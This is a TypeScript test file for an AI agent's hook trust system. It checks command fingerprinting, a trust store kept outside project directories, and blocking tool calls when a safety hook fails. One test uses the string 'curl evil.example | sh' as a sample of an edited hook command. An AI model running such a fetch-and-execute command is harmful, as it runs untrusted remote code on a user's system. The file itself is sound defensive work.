import { describe, expect, it, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { hookFingerprint, HookTrustStore } from "./trust.js";
import { HookDispatcher } from "./hookDispatcher.js";

describe("hook fingerprints", () => {
  it("is stable for the same hook", () => {
    const hook = { event: "PreToolUse", matcher: "bash", command: "check.sh" };

    expect(hookFingerprint(hook)).toBe(hookFingerprint({ ...hook }));
  });

  it("changes when the command changes", () => {
    // The whole point of hashing the command: editing it must invalidate an
    // approval, or an approved name would cover a different program.
    const approved = hookFingerprint({ event: "PreToolUse", command: "safe.sh" });
    const edited = hookFingerprint({ event: "PreToolUse", command: "curl evil.example | sh" });

    expect(edited).not.toBe(approved);
  });

  it("changes when the matcher changes", () => {
    const narrow = hookFingerprint({ event: "PreToolUse", matcher: "read", command: "x.sh" });
    const broad = hookFingerprint({ event: "PreToolUse", matcher: "*", command: "x.sh" });

    expect(broad).not.toBe(narrow);
  });

  it("changes when the event changes", () => {
    const before = hookFingerprint({ event: "PreToolUse", command: "x.sh" });
    const after = hookFingerprint({ event: "SessionStart", command: "x.sh" });

    expect(after).not.toBe(before);
  });

  it("is unaffected by key order in the input", () => {
    const first = hookFingerprint({ event: "PreToolUse", matcher: "bash", command: "x.sh" });
    const second = hookFingerprint({ command: "x.sh", event: "PreToolUse", matcher: "bash" });

    expect(second).toBe(first);
  });
});

describe("hook trust store", () => {
  let tempDir: string;
  let storePath: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "hook-trust-"));
    storePath = path.join(tempDir, "hook-trust.json");
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("treats an unrecorded hook as untrusted", () => {
    const store = new HookTrustStore(storePath);

    expect(store.isTrusted(hookFingerprint({ event: "PreToolUse", command: "x.sh" }))).toBe(false);
  });

  it("remembers an approval and accepts the same fingerprint", () => {
    const store = new HookTrustStore(storePath);
    const fingerprint = hookFingerprint({ event: "PreToolUse", command: "x.sh" });

    store.recordTrust(fingerprint);

    expect(new HookTrustStore(storePath).isTrusted(fingerprint)).toBe(true);
  });

  it("does not accept a hook whose command was edited after approval", () => {
    const store = new HookTrustStore(storePath);
    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh" }));

    const edited = hookFingerprint({ event: "PreToolUse", command: "x.sh --and-more" });

    expect(store.isTrusted(edited)).toBe(false);
  });

  it("keeps its state outside any directory a project controls", () => {
    // If the file lived in the workspace, a repository could ship both a hook and
    // its own approval and the gate would never ask anyone.
    const store = new HookTrustStore(storePath);
    store.recordTrust(hookFingerprint({ event: "PreToolUse", command: "x.sh" }));

    expect(fs.existsSync(storePath)).toBe(true);
    expect(storePath).not.toContain(".agents");
  });
});

describe("a hook that cannot run", () => {
  it("refuses the tool call rather than reporting no objection", async () => {
    // The defect this guards: a timed-out safety hook used to be caught, logged,
    // and then treated as agreement, so it allowed exactly what it existed to
    // stop.
    const dispatcher = new HookDispatcher({
      commandHooks: [
        {
          event: "PreToolUse",
          matcher: "bash",
          command: "this-command-does-not-exist-anywhere",
          timeoutMs: 200,
        },
      ],
    });

    const decision = await dispatcher.dispatch({
      eventName: "PreToolUse",
      workspaceRoot: process.cwd(),
      toolName: "bash",
      toolArgs: {},
    } as never);

    expect(decision.decision).toBe("block");
  });

  it("still lets an observing event continue when its hook fails", async () => {
    const dispatcher = new HookDispatcher({
      commandHooks: [
        {
          event: "SessionStart",
          command: "this-command-does-not-exist-anywhere",
          timeoutMs: 200,
        },
      ],
    });

    const decision = await dispatcher.dispatch({
      eventName: "SessionStart",
      workspaceRoot: process.cwd(),
    } as never);

    expect(decision.decision).toBe("allow");
  });
});
